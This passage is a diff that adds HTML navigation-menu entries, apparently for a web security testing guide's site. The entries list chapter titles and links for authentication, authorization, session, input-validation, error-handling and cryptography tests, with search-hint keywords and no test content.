+<li class="wstg-nav-item" data-title="4.4.6 Testing for Browser Cache Weaknesses" data-hints="wstg-athn-06 athn-06">
+<a href="/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses" title="4.4.6 Testing for Browser Cache Weaknesses">4.4.6 Testing for Browser Cache Weaknesses</a>
+</li>
+<li class="wstg-nav-item" data-title="4.4.7 Testing for Weak Authentication Methods" data-hints="wstg-athn-07 athn-07">
+<a href="/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Authentication_Methods" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Authentication_Methods" title="4.4.7 Testing for Weak Authentication Methods">4.4.7 Testing for Weak Authentication Methods</a>
+</li>
+<li class="wstg-nav-item" data-title="4.4.8 Testing for Weak Security Question Answer" data-hints="wstg-athn-08 athn-08">
+<a href="/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer" title="4.4.8 Testing for Weak Security Question Answer">4.4.8 Testing for Weak Security Question Answer</a>
+</li>
+<li class="wstg-nav-item" data-title="4.4.9 Testing for Weak Password Change or Reset Functionalities" data-hints="wstg-athn-09 athn-09">
+<a href="/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities" title="4.4.9 Testing for Weak Password Change or Reset Functionalities">4.4.9 Testing for Weak Password Change or Reset Functionalities</a>
+</li>
+<li class="wstg-nav-item" data-title="4.4.10 Testing for Weaker Authentication in Alternative Channel" data-hints="wstg-athn-10 athn-10">
+<a href="/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel" title="4.4.10 Testing for Weaker Authentication in Alternative Channel">4.4.10 Testing for Weaker Authentication in Alternative Channel</a>
+</li>
+<li class="wstg-nav-item" data-title="4.4.11 Testing Multi-Factor Authentication" data-hints="mfa 2fa totp wstg-athn-11 athn-11">
+<a href="/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication" title="4.4.11 Testing Multi-Factor Authentication">4.4.11 Testing Multi-Factor Authentication</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.5 Authorization Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/" data-nav-url="4-Web_Application_Security_Testing/05-Authorization_Testing/" title="4.5 Authorization Testing">4.5 Authorization Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.5.1 Testing Directory Traversal File Include" data-hints="path traversal dotdot lfi wstg-athz-01 athz-01">
+<a href="/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include" data-nav-url="4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include" title="4.5.1 Testing Directory Traversal File Include">4.5.1 Testing Directory Traversal File Include</a>
+</li>
+<li class="wstg-nav-item" data-title="4.5.2 Testing for Bypassing Authorization Schema" data-hints="wstg-athz-02 athz-02">
+<a href="/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema" data-nav-url="4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema" title="4.5.2 Testing for Bypassing Authorization Schema">4.5.2 Testing for Bypassing Authorization Schema</a>
+</li>
+<li class="wstg-nav-item" data-title="4.5.3 Testing for Privilege Escalation" data-hints="privesc wstg-athz-03 athz-03">
+<a href="/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation" data-nav-url="4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation" title="4.5.3 Testing for Privilege Escalation">4.5.3 Testing for Privilege Escalation</a>
+</li>
+<li class="wstg-nav-item" data-title="4.5.4 Testing for Insecure Direct Object References" data-hints="idor wstg-athz-04 athz-04">
+<a href="/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References" data-nav-url="4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References" title="4.5.4 Testing for Insecure Direct Object References">4.5.4 Testing for Insecure Direct Object References</a>
+</li>
+<li class="wstg-nav-item" data-title="4.5.5 Testing for OAuth Weaknesses" data-hints="oauth2 wstg-athz-05 athz-05">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses" data-nav-url="4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses" title="4.5.5 Testing for OAuth Weaknesses">4.5.5 Testing for OAuth Weaknesses</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.5.5.1 Testing for OAuth Authorization Server Weaknesses" data-hints="oauth2">
+<a href="/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05.1-Testing_for_OAuth_Authorization_Server_Weaknesses" data-nav-url="4-Web_Application_Security_Testing/05-Authorization_Testing/05.1-Testing_for_OAuth_Authorization_Server_Weaknesses" title="4.5.5.1 Testing for OAuth Authorization Server Weaknesses">4.5.5.1 Testing for OAuth Authorization Server Weaknesses</a>
+</li>
+<li class="wstg-nav-item" data-title="4.5.5.2 Testing for OAuth Client Weaknesses" data-hints="oauth2">
+<a href="/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05.2-Testing_for_OAuth_Client_Weaknesses" data-nav-url="4-Web_Application_Security_Testing/05-Authorization_Testing/05.2-Testing_for_OAuth_Client_Weaknesses" title="4.5.5.2 Testing for OAuth Client Weaknesses">4.5.5.2 Testing for OAuth Client Weaknesses</a>
+</li>
+</ul>
+</details>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.6 Session Management Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/" title="4.6 Session Management Testing">4.6 Session Management Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.6.1 Testing for Session Management Schema" data-hints="wstg-sess-01 sess-01">
+<a href="/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema" title="4.6.1 Testing for Session Management Schema">4.6.1 Testing for Session Management Schema</a>
+</li>
+<li class="wstg-nav-item" data-title="4.6.2 Testing for Cookies Attributes" data-hints="cookies set-cookie httponly samesite secure flag wstg-sess-02 sess-02">
+<a href="/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes" title="4.6.2 Testing for Cookies Attributes">4.6.2 Testing for Cookies Attributes</a>
+</li>
+<li class="wstg-nav-item" data-title="4.6.3 Testing for Session Fixation" data-hints="wstg-sess-03 sess-03">
+<a href="/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation" title="4.6.3 Testing for Session Fixation">4.6.3 Testing for Session Fixation</a>
+</li>
+<li class="wstg-nav-item" data-title="4.6.4 Testing for Exposed Session Variables" data-hints="wstg-sess-04 sess-04">
+<a href="/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/04-Testing_for_Exposed_Session_Variables" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/04-Testing_for_Exposed_Session_Variables" title="4.6.4 Testing for Exposed Session Variables">4.6.4 Testing for Exposed Session Variables</a>
+</li>
+<li class="wstg-nav-item" data-title="4.6.5 Testing for Cross Site Request Forgery" data-hints="csrf xsrf wstg-sess-05 sess-05">
+<a href="/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery" title="4.6.5 Testing for Cross Site Request Forgery">4.6.5 Testing for Cross Site Request Forgery</a>
+</li>
+<li class="wstg-nav-item" data-title="4.6.6 Testing for Logout Functionality" data-hints="wstg-sess-06 sess-06">
+<a href="/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/06-Testing_for_Logout_Functionality" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/06-Testing_for_Logout_Functionality" title="4.6.6 Testing for Logout Functionality">4.6.6 Testing for Logout Functionality</a>
+</li>
+<li class="wstg-nav-item" data-title="4.6.7 Testing Session Timeout" data-hints="wstg-sess-07 sess-07">
+<a href="/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/07-Testing_Session_Timeout" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/07-Testing_Session_Timeout" title="4.6.7 Testing Session Timeout">4.6.7 Testing Session Timeout</a>
+</li>
+<li class="wstg-nav-item" data-title="4.6.8 Testing for Session Puzzling" data-hints="wstg-sess-08 sess-08">
+<a href="/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Session_Puzzling" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Session_Puzzling" title="4.6.8 Testing for Session Puzzling">4.6.8 Testing for Session Puzzling</a>
+</li>
+<li class="wstg-nav-item" data-title="4.6.9 Testing for Session Hijacking" data-hints="wstg-sess-09 sess-09">
+<a href="/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/09-Testing_for_Session_Hijacking" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/09-Testing_for_Session_Hijacking" title="4.6.9 Testing for Session Hijacking">4.6.9 Testing for Session Hijacking</a>
+</li>
+<li class="wstg-nav-item" data-title="4.6.10 Testing JSON Web Tokens" data-hints="jwt wstg-sess-10 sess-10">
+<a href="/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens" title="4.6.10 Testing JSON Web Tokens">4.6.10 Testing JSON Web Tokens</a>
+</li>
+<li class="wstg-nav-item" data-title="4.6.11 Testing for Concurrent Sessions" data-hints="wstg-sess-11 sess-11">
+<a href="/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/11-Testing_for_Concurrent_Sessions" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/11-Testing_for_Concurrent_Sessions" title="4.6.11 Testing for Concurrent Sessions">4.6.11 Testing for Concurrent Sessions</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.7 Input Validation Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/" title="4.7 Input Validation Testing">4.7 Input Validation Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.7.1 Testing for Reflected Cross Site Scripting" data-hints="xss wstg-inpv-01 inpv-01">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting" title="4.7.1 Testing for Reflected Cross Site Scripting">4.7.1 Testing for Reflected Cross Site Scripting</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.2 Testing for Stored Cross Site Scripting" data-hints="xss wstg-inpv-02 inpv-02">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting" title="4.7.2 Testing for Stored Cross Site Scripting">4.7.2 Testing for Stored Cross Site Scripting</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.3 Testing for HTTP Verb Tampering" data-hints="verb tampering wstg-inpv-03 inpv-03 wstg-conf-06 conf-06">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering" title="4.7.3 Testing for HTTP Verb Tampering">4.7.3 Testing for HTTP Verb Tampering</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.4 Testing for HTTP Parameter Pollution" data-hints="hpp wstg-inpv-04 inpv-04">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution" title="4.7.4 Testing for HTTP Parameter Pollution">4.7.4 Testing for HTTP Parameter Pollution</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.5 Testing for SQL Injection" data-hints="sqli wstg-inpv-05 inpv-05">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection" title="4.7.5 Testing for SQL Injection">4.7.5 Testing for SQL Injection</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.7.5.1 Testing for Oracle">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle" title="4.7.5.1 Testing for Oracle">4.7.5.1 Testing for Oracle</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.5.2 Testing for MySQL">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL" title="4.7.5.2 Testing for MySQL">4.7.5.2 Testing for MySQL</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.5.3 Testing for SQL Server" data-hints="mssql sql server">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server" title="4.7.5.3 Testing for SQL Server">4.7.5.3 Testing for SQL Server</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.5.4 Testing PostgreSQL">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL" title="4.7.5.4 Testing PostgreSQL">4.7.5.4 Testing PostgreSQL</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.5.5 Testing for MS Access">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access" title="4.7.5.5 Testing for MS Access">4.7.5.5 Testing for MS Access</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.5.6 Testing for NoSQL Injection" data-hints="sqli nosqli">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection" title="4.7.5.6 Testing for NoSQL Injection">4.7.5.6 Testing for NoSQL Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.5.7 Testing for ORM Injection">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection" title="4.7.5.7 Testing for ORM Injection">4.7.5.7 Testing for ORM Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.5.8 Testing for Client-side">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.8-Testing_for_Client-side" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.8-Testing_for_Client-side" title="4.7.5.8 Testing for Client-side">4.7.5.8 Testing for Client-side</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.7.6 Testing for LDAP Injection" data-hints="ldapi wstg-inpv-06 inpv-06">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection" title="4.7.6 Testing for LDAP Injection">4.7.6 Testing for LDAP Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.7 Testing for XML Injection" data-hints="xxe xmli xml injection wstg-inpv-07 inpv-07">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection" title="4.7.7 Testing for XML Injection">4.7.7 Testing for XML Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.8 Testing for SSI Injection" data-hints="ssi injection wstg-inpv-08 inpv-08">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection" title="4.7.8 Testing for SSI Injection">4.7.8 Testing for SSI Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.9 Testing for XPath Injection" data-hints="xpathi xml wstg-inpv-09 inpv-09">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection" title="4.7.9 Testing for XPath Injection">4.7.9 Testing for XPath Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.10 Testing for IMAP SMTP Injection" data-hints="email injection wstg-inpv-10 inpv-10">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection" title="4.7.10 Testing for IMAP SMTP Injection">4.7.10 Testing for IMAP SMTP Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.11 Testing for Code Injection" data-hints="rce wstg-inpv-11 inpv-11">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection" title="4.7.11 Testing for Code Injection">4.7.11 Testing for Code Injection</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.7.11.1 Testing for File Inclusion" data-hints="lfi rfi">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion" title="4.7.11.1 Testing for File Inclusion">4.7.11.1 Testing for File Inclusion</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.7.12 Testing for Command Injection" data-hints="rce cmdi os command wstg-inpv-12 inpv-12">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection" title="4.7.12 Testing for Command Injection">4.7.12 Testing for Command Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.13 Testing for Format String Injection" data-hints="format string bug wstg-inpv-13 inpv-13">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection" title="4.7.13 Testing for Format String Injection">4.7.13 Testing for Format String Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.14 Testing for Incubated Vulnerability" data-hints="wstg-inpv-14 inpv-14">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/14-Testing_for_Incubated_Vulnerability" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/14-Testing_for_Incubated_Vulnerability" title="4.7.14 Testing for Incubated Vulnerability">4.7.14 Testing for Incubated Vulnerability</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.15 Testing for HTTP Response Splitting" data-hints="crlf response splitting wstg-inpv-15 inpv-15">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Response_Splitting" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Response_Splitting" title="4.7.15 Testing for HTTP Response Splitting">4.7.15 Testing for HTTP Response Splitting</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.16 Testing for HTTP Request Smuggling" data-hints="http smuggling wstg-inpv-16 inpv-16">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Request_Smuggling" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Request_Smuggling" title="4.7.16 Testing for HTTP Request Smuggling">4.7.16 Testing for HTTP Request Smuggling</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.17 Testing for Host Header Injection" data-hints="host header injection headers wstg-inpv-17 inpv-17">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection" title="4.7.17 Testing for Host Header Injection">4.7.17 Testing for Host Header Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.18 Testing for Server-side Template Injection" data-hints="ssti wstg-inpv-18 inpv-18">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection" title="4.7.18 Testing for Server-side Template Injection">4.7.18 Testing for Server-side Template Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.19 Testing for Server-Side Request Forgery" data-hints="ssrf wstg-inpv-19 inpv-19">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery" title="4.7.19 Testing for Server-Side Request Forgery">4.7.19 Testing for Server-Side Request Forgery</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.20 Testing for Mass Assignment" data-hints="mass assign wstg-inpv-20 inpv-20">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment" title="4.7.20 Testing for Mass Assignment">4.7.20 Testing for Mass Assignment</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.21 Testing for CSV Injection" data-hints="formula injection wstg-inpv-21 inpv-21">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/21-Testing_for_CSV_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/21-Testing_for_CSV_Injection" title="4.7.21 Testing for CSV Injection">4.7.21 Testing for CSV Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.22 Testing for Prototype Pollution" data-hints="pp wstg-inpv-22 inpv-22">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/22-Testing_for_Prototype_Pollution" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/22-Testing_for_Prototype_Pollution" title="4.7.22 Testing for Prototype Pollution">4.7.22 Testing for Prototype Pollution</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.23 Testing for Insecure Deserialization" data-hints="wstg-inpv-23 inpv-23">
+<a href="/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/23-Testing_for_Insecure_Deserialization" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/23-Testing_for_Insecure_Deserialization" title="4.7.23 Testing for Insecure Deserialization">4.7.23 Testing for Insecure Deserialization</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.8 Testing for Error Handling">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/" data-nav-url="4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/" title="4.8 Testing for Error Handling">4.8 Testing for Error Handling</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.8.1 Testing for Improper Error Handling" data-hints="wstg-errh-01 errh-01">
+<a href="/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_For_Improper_Error_Handling" data-nav-url="4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_For_Improper_Error_Handling" title="4.8.1 Testing for Improper Error Handling">4.8.1 Testing for Improper Error Handling</a>
+</li>
+<li class="wstg-nav-item" data-title="4.8.2 Testing for Stack Traces" data-hints="wstg-errh-02 errh-02 wstg-errh-01 errh-01">
+<a href="/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/02-Testing_for_Stack_Traces" data-nav-url="4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/02-Testing_for_Stack_Traces" title="4.8.2 Testing for Stack Traces">4.8.2 Testing for Stack Traces</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.9 Testing for Weak Cryptography">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/" data-nav-url="4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/" title="4.9 Testing for Weak Cryptography">4.9 Testing for Weak Cryptography</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.9.1 Testing for Weak Transport Layer Security" data-hints="tls ssl https wstg-cryp-01 cryp-01">
+<a href="/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security" data-nav-url="4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security" title="4.9.1 Testing for Weak Transport Layer Security">4.9.1 Testing for Weak Transport Layer Security</a>
+</li>
+<li class="wstg-nav-item" data-title="4.9.2 Testing for Padding Oracle" data-hints="padding oracle attack wstg-cryp-02 cryp-02">
+<a href="/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle" data-nav-url="4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle" title="4.9.2 Testing for Padding Oracle">4.9.2 Testing for Padding Oracle</a>
+</li>
+<li class="wstg-nav-item" data-title="4.9.3 Testing for Sensitive Information Sent via Unencrypted Channels" data-hints="tls ssl https cleartext wstg-cryp-03 cryp-03">
+<a href="/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels" data-nav-url="4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels" title="4.9.3 Testing for Sensitive Information Sent via Unencrypted Channels">4.9.3 Testing for Sensitive Information Sent via Unencrypted Channels</a>
+</li>
+<li class="wstg-nav-item" data-title="4.9.4 Testing for Weak Cryptographic Primitives" data-hints="wstg-cryp-04 cryp-04">
